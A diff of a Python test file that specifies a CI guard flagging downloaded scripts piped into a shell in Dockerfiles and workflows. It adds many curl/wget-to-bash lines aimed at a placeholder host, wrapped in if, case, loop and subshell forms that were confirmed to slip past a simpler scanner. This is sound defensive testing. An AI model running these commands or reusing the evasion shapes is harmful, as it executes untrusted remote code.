@@ -8,8 +8,9 @@ The scan discovers its own inputs. An enumerated list looks identical to a compl
 until someone adds a file.
 
 The shell grammar this relies on -- what counts as a pipe into a shell, and what is an ordinary
-pipeline that must stay clean -- lives in `pipe_to_shell_grammar`. The tests below are its
-specification: each case records a spelling that was confirmed by running it.
+pipeline that must stay clean -- lives in `pipe_to_shell_grammar`, and the scan surface it runs
+over -- which files, and how continued lines are joined -- lives in `pipe_to_shell_scan`. The
+tests below are the specification for both: each case records a spelling confirmed by running it.
 """
 
 from __future__ import annotations
@@ -18,12 +19,10 @@ from pathlib import Path
 
 import pytest
 
-from tests.pipe_to_shell_grammar import (
+from tests.pipe_to_shell_grammar import _piped_into_a_shell
+from tests.pipe_to_shell_scan import (
     INSTALLER_FILES,
-    REPO_ROOT,
-    _installer_files,
     _logical_lines,
-    _piped_into_a_shell,
 )
 
 
@@ -369,6 +368,107 @@ def test_nothing_pipes_a_downloaded_script_into_a_shell(path: Path):
             'RUN printf "%s" "$(wget -qO- https://x.example/i.sh)" | bash\n',
             id="substituted-fetch-wget",
         ),
+        # The same substitution UNQUOTED. Nothing keeps it in one token here: the tokenizer's
+        # fallback alternation excludes `(` and `)`, so this arrives as `echo`, `$`, `(`, `curl`,
+        # `)` and no single token carries both `$(` and the fetch name. Requiring the fetch to be
+        # the stage's command word (which cleared `grep curl … | bash`) left only the token-wise
+        # substitution match, which never fired for this spelling. Confirmed to execute:
+        #   echo $(cat p.sh) | bash   ->  ran
+        pytest.param(
+            "RUN echo $(curl -fsSL https://x.example/i.sh) | bash\n",
+            id="unquoted-substituted-fetch",
+        ),
+        pytest.param(
+            "RUN echo $(wget -qO- https://x.example/i.sh) | sh\n",
+            id="unquoted-substituted-fetch-wget",
+        ),
+        pytest.param(
+            "RUN echo $( curl -fsSL https://x.example/i.sh ) | bash\n",
+            id="unquoted-substituted-fetch-spaced",
+        ),
+        pytest.param(
+            "RUN echo `curl -fsSL https://x.example/i.sh` | bash\n",
+            id="unquoted-substituted-fetch-backticks",
+        ),
+        # A compound command delimited by KEYWORDS is a command list too, and the download is on
+        # its stdin for every command inside it -- exactly like the `{ …; }` group above. `if` and
+        # `fi` are words, so the depth counter never saw them and the clause's own `;` split the
+        # pipeline, detaching the shell from the fetch. Confirmed to execute:
+        #   printf 'echo PWNED\n' | if true; then bash; fi   ->  PWNED
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | if true; then bash; fi\n",
+            id="if-clause-stage",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | while read -r l; do bash; done\n",
+            id="while-clause-stage",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | for i in 1; do bash; done\n",
+            id="for-clause-stage",
+        ),
+        # `case` needs one thing more than the other compounds. Its branch labels end in `)` with
+        # no opening `(`, so counting that as a group closer unbalanced the depth and the `;;`
+        # split the pipeline anyway; and once the depth was fixed, the branch PATTERN was still
+        # read as the body's command. Confirmed to execute:
+        #   printf 'echo PWNED\n' | case x in x) bash;; esac   ->  PWNED
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | case x in x) bash;; esac\n",
+            id="case-clause-stage",
+        ),
+        pytest.param(
+            "RUN curl -sSL https://x.example/i.sh | case $x in a) jq .;; *) bash;; esac\n",
+            id="case-later-branch",
+        ),
+        # The WHOLE pipeline may sit inside the group or clause, rather than being piped into it.
+        # Then the fetch never appears at the top level at all -- the enclosing construct is one
+        # stage, and a scan that only walks top-level stages sees a single command with no pipe in
+        # it. Every spelling runs the download:
+        #   ( cat p.sh | bash )                  ->  ran
+        #   if true; then cat p.sh | bash; fi    ->  ran
+        pytest.param(
+            "RUN ( curl -sSL https://x.example/i.sh | bash )\n", id="pipeline-inside-a-subshell"
+        ),
+        pytest.param(
+            "RUN { curl -sSL https://x.example/i.sh | bash; }\n", id="pipeline-inside-a-brace-group"
+        ),
+        pytest.param(
+            "RUN if true; then curl -sSL https://x.example/i.sh | bash; fi\n",
+            id="pipeline-inside-an-if",
+        ),
+        pytest.param(
+            "RUN while true; do curl -sSL https://x.example/i.sh | bash; done\n",
+            id="pipeline-inside-a-while",
+        ),
+        pytest.param(
+            "RUN case x in x) curl -sSL https://x.example/i.sh | bash;; esac\n",
+            id="pipeline-inside-a-case",
+        ),
+        pytest.param(
+            "RUN if true; then if true; then curl -sSL https://x.example/i.sh | bash; fi; fi\n",
+            id="pipeline-inside-nested-clauses",
+        ),
+        pytest.param(
+            "RUN if true; then ( curl -sSL https://x.example/i.sh | bash ); fi\n",
+            id="pipeline-inside-a-group-inside-a-clause",
+        ),
+        # The shapes a real vendor install actually takes. A conditional guard around the fetch is
+        # the ordinary way to write "install it if it is not already here", so these are the
+        # spellings most likely to appear in a Dockerfile -- and each was invisible while a clause
+        # counted as one opaque stage.
+        pytest.param(
+            'RUN set -eux; if [ "$INSTALL" = "true" ]; then'
+            " curl -fsSL https://x.example/i.sh | bash; fi\n",
+            id="guarded-vendor-install",
+        ),
+        pytest.param(
+            "RUN if [ ! -f /usr/bin/tool ]; then curl -fsSL https://x.example/i.sh | sh -; fi\n",
+            id="install-when-absent",
+        ),
+        pytest.param(
+            'RUN for v in 1 2; do curl -fsSL "https://x.example/$v.sh" | bash; done\n',
+            id="install-in-a-loop",
+        ),
         # Dockerfile EXEC form. Docker runs the array as argv with no shell of its own, but here
         # argv[0] IS a shell and argv[2] is the command it runs, so the download is executed just
         # as in the shell form. The JSON quoting is FILE syntax; leaving it on made the whole
@@ -547,6 +647,39 @@ def test_the_guard_catches_a_piped_installer_written_as_a_yaml_block(block: str,
         test_nothing_pipes_a_downloaded_script_into_a_shell(planted)
 
 
+@pytest.mark.parametrize(
+    "step",
+    [
+        pytest.param(
+            "      - run: if true; then curl -fsSL https://x.example/i.sh | bash; fi\n",
+            id="workflow-bare-scalar",
+        ),
+        pytest.param(
+            '      - run: "if true; then curl -fsSL https://x.example/i.sh | bash; fi"\n',
+            id="workflow-quoted-scalar",
+        ),
+        pytest.param(
+            "      - name: install\n"
+            "        run: if true; then curl -fsSL https://x.example/i.sh | bash; fi\n",
+            id="workflow-named-step",
+        ),
+    ],
+)
+def test_the_guard_catches_a_conditional_installer_in_a_workflow(step: str, tmp_path: Path):
+    """A clause reaches the guard through the YAML path as readily as the Dockerfile one.
+
+    Worth pinning separately: the `run:` value arrives after keyword stripping and, in the quoted
+    form, after unwrapping a scalar -- so a compound that is handled in a `RUN` line is not
+    thereby proven handled here. This is also the shape a workflow actually uses to install a
+    tool only when it is missing.
+    """
+    planted = tmp_path / "wf.yml"
+    planted.write_text("jobs:\n  j:\n    steps:\n" + step)
+
+    with pytest.raises(AssertionError, match="pipes a downloaded script into a shell"):
+        test_nothing_pipes_a_downloaded_script_into_a_shell(planted)
+
+
 def test_the_guard_catches_a_yaml_line_that_both_folds_back_and_continues_on(tmp_path: Path):
     """`| tee /tmp/i.sh |` starts with an operator AND ends with one.
 
@@ -565,318 +698,3 @@ def test_the_guard_catches_a_yaml_line_that_both_folds_back_and_continues_on(tmp
 
     with pytest.raises(AssertionError, match="pipes a downloaded script into a shell"):
         test_nothing_pipes_a_downloaded_script_into_a_shell(planted)
-
-
-@pytest.mark.parametrize(
-    "line",
-    [
-        pytest.param('echo "${sha}  ${deb}" | sha256sum -c -', id="verify-a-local-file"),
-        pytest.param("curl -sSL https://x.example/c.tgz | sudo tar -xz -C /usr/bin", id="into-tar"),
-        pytest.param("curl -s https://x.example/api | jq .version", id="into-jq"),
-        pytest.param("curl -s https://x.example/list | grep bash", id="shell-name-as-argument"),
-        pytest.param("curl -s https://x.example/l | grep bash-completion", id="name-is-a-prefix"),
-        # The assignment rule must not turn an assignment-shaped ARGUMENT into a match: here the
-        # shell name is still just text being searched for, not the command being run.
-        pytest.param("curl -s https://x.example/l | grep mode=install bash", id="assignment-arg"),
-        # `||` is a fallback, not a pipe: the shell runs on FAILURE of the fetch and nothing is
-        # piped into it. Reading the second bar of a `||` as the pipe made this legitimate
-        # recovery branch match -- an over-match introduced by the multi-stage-pipe fix.
-        pytest.param(
-            "curl -fsSL https://x.example/f || bash recover.sh", id="or-fallback-to-a-shell"
-        ),
-        pytest.param("wget -q https://x.example/f || sh -c 'exit 1'", id="or-fallback-to-sh"),
-        # A flag's OPERAND that happens to be named like a shell. `env -u bash cat` unsets the
-        # variable `bash` and runs `cat`; flagging it would fail CI on a legitimate pipeline.
-        # Knowing each flag's arity is what tells the operand apart from the command.
-        pytest.param("curl -s https://x.example/f | env -u bash cat", id="shell-named-operand"),
-        pytest.param("curl -s https://x.example/f | sudo -u bash whoami", id="shell-named-user"),
-        # `&&` and `;` end the pipeline: the shell that follows gets nothing piped into it.
-        pytest.param("curl -s https://x.example/f > /tmp/f && bash /tmp/o.sh", id="and-then-shell"),
-        pytest.param("curl -s https://x.example/f ; bash unrelated.sh", id="semicolon-then-shell"),
-        # A wrapper in front of something that is not a shell is still not a shell.
-        pytest.param("curl -s https://x.example/f | timeout 30 jq .", id="timeout-into-jq"),
-        # `-s`/`-i` start a shell only when NOTHING follows them. With a command present, sudo
-        # runs THAT and the stream is never executed -- so the flag alone cannot be the signal.
-        # Confirmed: printf 'echo X\n' | sudo -n -s echo hi   ->   hi
-        # The fetch name must be the stage's COMMAND. Matching it in any token made a search
-        # PATTERN a download, and the shell downstream receives locally selected text:
-        #   grep echo commands.txt | bash  ->  runs the local file's line, fetches nothing
-        pytest.param("grep curl commands.txt | bash", id="fetch-name-is-a-pattern"),
-        pytest.param("grep -r wget src | bash", id="fetch-name-is-a-pattern-with-flags"),
-        # `eval` only matters when the capture reads STDIN. A literal or a variable does not.
-        pytest.param("curl -s https://x.example/f | bash -c 'eval \"$FOO\"'", id="eval-a-variable"),
-        pytest.param(
-            "curl -s https://x.example/f | bash -c 'eval \"echo SAFE\"'", id="eval-a-literal"
-        ),
-        # The new wrapper and operator must not make ordinary destinations match.
-        pytest.param("curl -s https://x.example/f | unshare jq .", id="unshare-into-jq"),
-        pytest.param("curl -s https://x.example/f |& jq .", id="pipe-both-streams-into-jq"),
-        # A chained tool still honours the LAST tool's own selection and `-c`, so the safe
-        # spellings stay safe through the chain.
-        pytest.param(
-            "curl -s https://x.example/f | sudo su -s /usr/bin/sha256sum nobody",
-            id="sudo-then-su-selects-a-non-shell",
-        ),
-        pytest.param(
-            "curl -s https://x.example/f | sudo su -s /bin/sh -c 'jq .'",
-            id="sudo-then-su-defers-to-c",
-        ),
-        pytest.param("curl -s https://x.example/f | sudo -u root jq .", id="sudo-user-then-jq"),
-        pytest.param("curl -s https://x.example/f | 2>/dev/null jq .", id="redirection-then-jq"),
-        # `-s`/`--shell` CHOOSES which program `su`/`runuser` starts, and it need not be a shell.
-        # Matching `su` as a shell NAME made every spelling dangerous, including safe ones:
-        #   printf 'hello\n' | sudo -n su -s /usr/bin/sha256sum nobody  ->  5891b5b5…  (hashed)
-        #   printf 'hello\n' | sudo -n runuser -u root sha256sum        ->  5891b5b5…  (hashed)
-        pytest.param(
-            "curl -s https://x.example/f | su -s /usr/bin/sha256sum nobody",
-            id="su-selects-a-non-shell",
-        ),
-        pytest.param(
-            "curl -s https://x.example/f | runuser -u root sha256sum", id="runuser-runs-a-non-shell"
-        ),
-        # A chosen shell still defers to its own `-c`, exactly as `sh -c` does -- this is the
-        # verified-download pattern the guard exists to encourage:
-        #   printf 'echo PWNED\n' | sudo -n su -s /bin/sh -c 'echo RAN_C'  ->  RAN_C only
-        pytest.param(
-            "curl -s https://x.example/f | su -s /bin/sh -c 'sha256sum -c -'",
-            id="su-selected-shell-defers-to-c",
-        ),
-        pytest.param("curl -s https://x.example/f | su -c 'jq .'", id="su-c-non-shell"),
-        # A group whose commands are all ordinary is still ordinary; the depth tracking must not
-        # make every group suspicious.
-        pytest.param("curl -s https://x.example/f | { true; jq .; }", id="brace-group-into-jq"),
-        pytest.param("curl -s https://x.example/f | (true; jq .)", id="subshell-group-into-jq"),
-        # A separator at depth 0 still ENDS the pipeline: what follows has nothing piped into it.
-        pytest.param(
-            "curl -s https://x.example/f | jq . ; bash recover.sh", id="semicolon-ends-it"
-        ),
-        # A substitution that feeds a non-shell, and a shell fed by a substitution with no fetch
-        # in it. Neither downloads-then-executes.
-        pytest.param(
-            'printf "%s" "$(curl -fsSL https://x.example/d.json)" | jq .',
-            id="substituted-fetch-into-jq",
-        ),
-        pytest.param('echo "$(date)" | bash', id="substitution-without-a-fetch"),
-        # An exec-form array that runs no shell rejoins into a stage whose command word is not a
-        # shell, so it stays clean for the same reason its shell-form spelling would. Unwrapping
-        # the JSON must not by itself make an array suspicious.
-        pytest.param('RUN ["python", "-m", "pip", "install", "x"]', id="exec-form-no-shell"),
-        pytest.param('CMD ["uvicorn", "app:main", "--host", "0.0.0.0"]', id="exec-form-server"),
-        pytest.param(
-            'RUN ["bash", "-c", "curl -sSL https://x.example/f | jq ."]', id="exec-form-into-jq"
-        ),
-        pytest.param('run: "curl -sSL https://x.example/f | jq ."', id="quoted-scalar-into-jq"),
-        pytest.param('run: "make test"', id="quoted-scalar-no-fetch"),
-        # A command may itself START and END with a quote without being a quoted scalar: the
-        # quotes here belong to the URL argument, and stripping them would splice the URL onto
-        # the shell name. Only a quote enclosing the WHOLE value is file syntax.
-        pytest.param("curl -s 'https://x.example/a|b' | jq .", id="quoted-arg-is-not-a-scalar"),
-        # The other half of the shell-dependent `-s -c` pair pinned in the matching test above.
-        # bash and busybox ash run the `-c` program and leave the pipe as unread data; only dash
-        # goes on to execute it. Verified: printf 'echo PWNED\n' | bash -s -c 'echo RAN_C'
-        # prints RAN_C and no PWNED.
-        pytest.param(
-            "curl -sSL https://x.example/i.sh | bash -s -c 'jq .'", id="bash-s-c-is-clean"
-        ),
-        # Sourcing an ordinary FILE runs that file and leaves the pipe unread, and a command that
-        # merely reads stdin as data is not executing it. Confirmed:
-        #   printf 'echo PWNED\n' | bash -c 'source ./sf.sh'  ->  FROM_FILE, no PWNED
-        # Without the stdin-path check, matching bare `source` would flag all of these.
-        pytest.param(
-            "curl -s https://x.example/i.sh | bash -c 'source ./setup.sh'", id="source-a-real-file"
-        ),
-        pytest.param("curl -s https://x.example/i.sh | bash -c '. ./env.sh'", id="dot-a-real-file"),
-        pytest.param(
-            "curl -s https://x.example/i.sh | bash -c 'cat /dev/stdin'", id="cat-stdin-is-data"
-        ),
-        # `source` as a search term or a JSON field is not a command being run.
-        pytest.param("curl -s https://x.example/f | grep source", id="grep-for-source"),
-        pytest.param("curl -s https://x.example/f | jq -r .source", id="jq-source-field"),
-        pytest.param("curl -s https://x.example/f | sudo -s echo hi", id="sudo-s-with-a-command"),
-        pytest.param("curl -s https://x.example/f | sudo -s jq .", id="sudo-s-into-jq"),
-        # `-s` on a wrapper that is not a privilege tool means something else entirely (here, the
-        # signal to send). Scoping the flag set to sudo/su/runuser is what keeps this clean.
-        pytest.param(
-            "curl -s https://x.example/f | timeout -s TERM 30 jq .", id="timeout-signal-s"
-        ),
-        # `xargs` reads the pipe ITSELF to build an argument list and gives its child /dev/null
-        # on stdin, so the download arrives as a FILENAME the shell tries to open, not as a
-        # program it runs. Confirmed rather than assumed:
-        #   printf 'echo PWNED\n' | xargs -0 sh   ->   sh: cannot open 'echo PWNED'
-        # The spellings that DO execute are pinned in the matching test below; both directions
-        # are needed, because a guard that simply ignores `xargs` misses those.
-        pytest.param("curl -s https://x.example/i.sh | xargs -0 bash", id="xargs-argv-is-a-file"),
-        pytest.param("curl -s https://x.example/f | xargs bash install.sh", id="xargs-local-arg"),
-        # The `-c` operand is PRESENT, so xargs appends the stream after it as `$0` rather than
-        # using it as the program text. `echo SAFE` runs; the download does not.
-        pytest.param(
-            "curl -s https://x.example/i.sh | xargs -0 sh -c 'echo SAFE'", id="xargs-c-has-operand"
-        ),
-        # `{}` is ordinary text unless a replace flag introduced it. Defaulting to `{}` whenever
-        # none was given made every jq filter and printf format containing braces match --
-        # a false positive on exactly the careful pipelines this guard exists to encourage.
-        # Confirmed literal: printf 'X\n' | xargs -0 sh -c 'echo {}'  ->  {}
-        pytest.param(
-            "curl -s https://x.example/d.json | xargs -0 sh -c 'jq {}'", id="braces-without-a-flag"
-        ),
-        pytest.param(
-            "curl -s https://x.example/d | xargs -n1 sh -c 'printf %s {}'",
-            id="braces-with-max-args",
-        ),
-        pytest.param(
-            'curl -s https://x.example/d | xargs -0 sh -c \'echo "{\\"k\\":1}"\'',
-            id="json-braces-in-a-program",
-        ),
-        # Operand-taking flags whose values are numbers, not files: knowing xargs' arity must not
-        # over-reach into treating every following token as consumed.
-        pytest.param("curl -s https://x.example/i.sh | xargs -n 2 bash", id="xargs-max-args-short"),
-        pytest.param(
-            "curl -s https://x.example/i.sh | xargs --max-args 2 bash", id="xargs-max-args-long"
-        ),
-        # The command name merely STARTS with the shell name.
-        pytest.param("curl -s https://x.example/f | sudo -u shane cat", id="operand-shell-prefix"),
-        # A command word after `-s` takes over, so the flag no longer starts a shell:
-        #   printf 'X\n' | sudo -n -s jq .   ->   jq parses the stream, nothing is executed
-        pytest.param("curl -s https://x.example/f | sudo -s jq .", id="sudo-dash-s-with-command"),
-        # `-u shane` and `-p prompt` contain the letters the flag scan looks for, in an OPERAND.
-        # Reading them as `-s`/`-i` would flag ordinary pipelines.
-        pytest.param("curl -s https://x.example/f | sudo -u sysadmin cat", id="operand-has-s"),
-        pytest.param(
-            "curl -s https://x.example/f | sudo -p 'pass:' cat", id="prompt-operand-has-s"
-        ),
-        # `su -c 'echo hi'` runs the operand and the stream is data, exactly like `sh -c`.
-        # Confirmed: printf 'X\n' | sudo -n su -c 'echo Y'  ->  Y
-        pytest.param("curl -s https://x.example/f | su -c 'echo hi'", id="su-dash-c-non-shell"),
-        # The command name merely CONTAINS `su`.
-        pytest.param("curl -s https://x.example/f | sudo -u root sudoedit", id="name-contains-su"),
-        # The other side of the quoted-URL fix: a query string must not make an ordinary
-        # pipeline match either, so the fix cannot be "treat quoted spans as opaque".
-        pytest.param("curl -s 'https://x.example/f?a=1&b=2' | jq .", id="quoted-url-into-jq"),
-        # A `|` inside a URL value: counting `|` anywhere must not make the surrounding pipeline
-        # match when the command it feeds is not a shell.
-        pytest.param("curl -s 'https://x.example/f?p=a|b' | jq .", id="pipe-inside-a-url-value"),
-        # A URL segment that IS a shell name. Opening the quotes here invented a pipeline stage
-        # that does not exist -- curl feeds `jq`, and the `bash` is part of the path.
-        pytest.param("curl -s 'https://x.example/f|bash' | jq .", id="shell-named-url-segment"),
-        # `-c` is not exclusive to shells: jq takes one too, and its argument is a filter.
-        pytest.param(
-            'jq -c "curl https://x.example/i.sh | bash" /tmp/f', id="dash-c-on-a-non-shell"
-        ),
-        # Accepting fused short options must not turn every long flag ending in a c-word into a
-        # command opener: `--config` is not `--command`.
-        pytest.param(
-            'sh --config "curl https://x.example/i.sh | bash"', id="long-flag-is-not-command"
-        ),
-        # Accepting `ash` must not turn every word ending in those letters into a shell. `cash`
-        # and `stash` end in `ash`; the name has to match WHOLE, not as a suffix.
-        pytest.param("curl -s https://x.example/f | cash --report", id="ash-is-not-a-suffix"),
-        pytest.param("curl -s https://x.example/f | git stash", id="stash-is-not-a-shell"),
-        # `-S` splits its operand and runs it -- but only when the operand really is a shell.
-        pytest.param("curl -s https://x.example/f | env -S 'jq .version'", id="split-into-jq"),
-        pytest.param("curl -s https://x.example/f | env -S'jq .version'", id="split-fused-into-jq"),
-        # `-S` on something that is not `env` is an ordinary flag: jq's is --sort-keys.
-        pytest.param("curl -s https://x.example/f | jq -S .", id="dash-s-on-a-non-env"),
-        # `sh -c '…'` takes its program from the operand and leaves the pipe on stdin for that
-        # program, so the download is DATA. Verifying a checksum this way is the pattern this
-        # guard exists to encourage, and flagging it would fail CI on the recommended spelling.
-        pytest.param(
-            "curl -s https://x.example/checksums.txt | sh -c 'sha256sum -c -'",
-            id="dash-c-verifies-the-download",
-        ),
-        pytest.param("curl -s https://x.example/f | bash -c 'jq .'", id="dash-c-runs-a-non-shell"),
-        # BusyBox dispatches non-shell applets too; stepping over the wrapper must not make the
-        # applet after it match.
-        pytest.param("curl -s https://x.example/f | busybox cat", id="busybox-non-shell-applet"),
-        # The other direction for a multi-word `-c` body: a NESTED `-c` whose own operand runs a
-        # non-shell. The recursion has to reach the inner operand, not stop at the inner `bash`.
-        pytest.param(
-            "curl -s https://x.example/f | sh -c 'bash -c \"jq .\"'", id="nested-dash-c-runs-jq"
-        ),
-        pytest.param("curl -s https://x.example/f | sh -c 'exec jq .'", id="dash-c-body-exec-jq"),
-        # Asking EVERY command in a `-c` list must not decay into "a shell name appears in the
-        # program". No shell runs here, so the download is still data.
-        pytest.param("curl -s https://x.example/f | sh -c 'true; jq .'", id="dash-c-list-into-jq"),
-        pytest.param(
-            "curl -s https://x.example/f | sh -c 'echo hi; cat'", id="dash-c-list-into-cat"
-        ),
-        # Parentheses became tokenizer operators; inside a quoted value they must stay data.
-        pytest.param("curl -s 'https://x.example/f(1).json' | jq .", id="parens-in-a-quoted-url"),
-        pytest.param("curl -s https://x.example/f | grep '(bash)'", id="parens-in-a-grep-pattern"),
-        # A shell OPTION's operand is skipped, so a shell-named one must not read as a command.
-        # `bash -o bash script.sh` sets an (invalid) option and runs a script, not a nested shell.
-        pytest.param("curl -s https://x.example/f | jq -o bash .", id="option-operand-not-command"),
-        # The format keyword is stripped, which must not strip a real command that starts with
-        # the same letters. `runner` is not `run:`.
-        pytest.param(
-            "curl -s https://x.example/f | runner --exec bash", id="keyword-is-not-a-prefix"
-        ),
-    ],
-)
-def test_the_pipe_to_shell_guard_does_not_flag_ordinary_pipelines(line: str, tmp_path: Path):
-    """The rule is "do not execute a download", not "do not use a pipe".
-
-    A guard that fires on every pipeline gets suppressed rather than fixed, so the non-shell
-    destinations are pinned too. `grep bash` is the sharp one: the shell name appears as an
-    ARGUMENT being searched for, not as the command being run, and an earlier draft of the
-    wrapper handling matched it.
-    """
-    planted = tmp_path / "Dockerfile"
-    planted.write_text(f"FROM scratch\nRUN {line}\n")
-
-    test_nothing_pipes_a_downloaded_script_into_a_shell(planted)
-
-
-@pytest.mark.parametrize(
-    "line",
-    [
-        pytest.param('run: ""', id="empty-double-quoted-scalar"),
-        pytest.param("run: ''", id="empty-single-quoted-scalar"),
-        pytest.param('run: "   "', id="whitespace-only-scalar"),
-    ],
-)
-def test_an_empty_quoted_scalar_is_clean_rather_than_a_crash(line: str):
-    """An empty `run:` value must answer "clean", not abort the scan.
-
-    Unwrapping a quoted scalar reads its first token to tell file syntax from a command whose
-    own ARGUMENT is quoted. An empty body has no first token, so indexing it raised IndexError
-    -- and an exception here fails the whole repo-wide guard rather than one line, turning a
-    trivially clean input into a broken build.
-    """
-    assert not _piped_into_a_shell(line)
-
-
-def test_the_installer_scan_covers_every_dockerfile_in_the_repo():
-    """The scan discovers its own inputs, so a new Dockerfile cannot silently escape it.
-
-    An enumerated list looks identical to a complete one right up until someone adds a file:
-    `docker/Dockerfile.kernelcache` and its relayer were both outside a list whose own docstring
-    called the rule repo-wide. Deriving the set from the tree is what makes the claim true.
-    """
-    on_disk = {p.resolve() for p in REPO_ROOT.rglob("Dockerfile*") if ".git" not in p.parts}
-    scanned = {p.resolve() for p in INSTALLER_FILES}
-    missed = on_disk - scanned
-    assert not missed, f"Dockerfiles not covered by the installer scan: {sorted(missed)}"
-
-
-def test_the_installer_scan_covers_workflows_under_both_yaml_extensions():
-    """GitHub Actions runs `.yaml` as readily as `.yml`, so the scan must accept both.
-
-    There is no `.yaml` workflow today, which is exactly why this is worth pinning: a scan keyed
-    to one extension goes green forever, and the day a workflow is added or renamed under the
-    other one it silently leaves coverage. So plant one and re-run the REAL discovery. An earlier
-    version of this test rebuilt the glob patterns inline and asserted against that copy, which
-    passed unchanged when the production glob was narrowed back to `*.yml` -- it was testing its
-    own literal, not the scan.
-    """
-    workflows = REPO_ROOT / ".github" / "workflows"
-    on_disk = {p.resolve() for p in workflows.iterdir() if p.suffix in (".yml", ".yaml")}
-    assert not on_disk - {p.resolve() for p in INSTALLER_FILES}, "a workflow is outside the scan"
-
-    planted = workflows / "zz-extension-probe.yaml"
-    planted.write_text("name: probe\non: workflow_dispatch\njobs: {}\n")
-    try:
-        assert planted.resolve() in {p.resolve() for p in _installer_files()}, (
-            "a .yaml workflow would not be discovered"
-        )
-    finally:
-        planted.unlink()
